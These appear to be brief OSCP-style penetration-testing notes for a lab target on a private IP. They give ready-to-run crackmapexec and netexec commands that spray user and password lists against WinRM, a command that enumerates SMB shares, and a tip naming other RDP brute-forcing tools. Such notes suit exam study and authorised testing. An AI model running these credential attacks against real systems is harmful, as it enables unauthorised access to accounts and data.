---
IP_KALI: 192.168.45.155
IP_TARGET: 192.168.195.156
USER: users.txt
DOMAIN: oscp.exam
PASSWD: passwords.txt
---
- crackmapexec winrm <span id="IP_TARGET"/>192.168.195.156<span type="end"/> -u <span id="USER"/>users.txt<span type="end"/> -p '<span id="PASSWD"/>passwords.txt<span type="end"/>' -d <span id="DOMAIN"/>oscp.exam<span type="end"/> --continue-on-success
- ~={red}CME is famous for not being a reliable tool for RDP brute forcing. You may try other tools such as crowbar or impacket-rdp_check or netexec.=~
- netexec winrm <span id="IP_TARGET"/>192.168.195.156<span type="end"/> -u <span id="USER"/>users.txt<span type="end"/> -p <span id="PASSWD"/>passwords.txt<span type="end"/> --continue-on-success --local-auth
- Enumerate smb shares:
	- netexec smb <span id="IP_TARGET"/>192.168.195.156<span type="end"/> -u <span id="USER"/>users.txt<span type="end"/> -p <span id="PASSWD"/>passwords.txt<span type="end"/> --shares